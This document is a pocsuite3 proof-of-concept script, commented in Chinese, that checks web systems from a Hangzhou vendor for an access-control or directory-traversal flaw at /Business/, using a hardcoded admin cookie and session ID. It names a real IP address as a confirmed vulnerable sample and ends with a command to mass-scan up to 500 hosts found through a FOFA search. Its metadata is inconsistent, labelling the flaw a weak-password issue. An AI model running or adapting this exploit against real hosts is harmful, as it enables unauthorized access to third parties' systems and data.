from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class XXLJOBPOC(POCBase):
    vulID = "Business 目录遍历漏洞"#漏洞描述  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "XZ"  # PoC作者的大名
    vulDate = "2022-7-14"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-7-14"  # 编写 PoC 的日期
    updateDate = "2022-7-14"  # PoC 更新的时间,默认和编写时间一样
    references = ["http://wiki.peiqi.tech/wiki/webapp/%E5%90%89%E6%8B%89%E7%A7%91%E6%8A%80"]  # 漏洞地址来源,0day不用写
    name = "Business 目录遍历漏洞"  # PoC 名称
    appPowerLink = "http://wiki.peiqi.tech/wiki/webapp/%E5%90%89%E6%8B%89%E7%A7%91%E6%8A%80"  # 漏洞厂商主页地址
    appName = "Business 目录遍历漏洞"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["http://60.30.84.162:9999"]  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
               杭州吉拉科技有限公司多个系统存在目录遍历漏洞，由于 /Business/ 访问控制不严，攻击者可利用该漏洞获取敏感信息。


           """  # 漏洞简要描述
    pocDesc = """
               /Business/
           """  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        full_url = f"{self.url}/Business/"
        cookies = {"username": "admin", "ASP.NET_SessionId": "zbgpij5vs3a2nffd4s3ytmfh"}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        result = []
        try:
            response = requests.post(full_url, headers=headers, cookies=cookies,allow_redirects=False, verify=False, timeout=5)
            # 判断是否存在漏洞
            if "Cache-Control" not in response.text:
                result.append(self.url)
        except Exception as e:
            pass
        finally:
            return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.pocDesc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(XXLJOBPOC)
#pocsuite -r ./pocs/1Business.py --dork-fofa  '"Supperd By 吉拉科技"' --max-size 500 --save-file ./1Business.txt --threads 505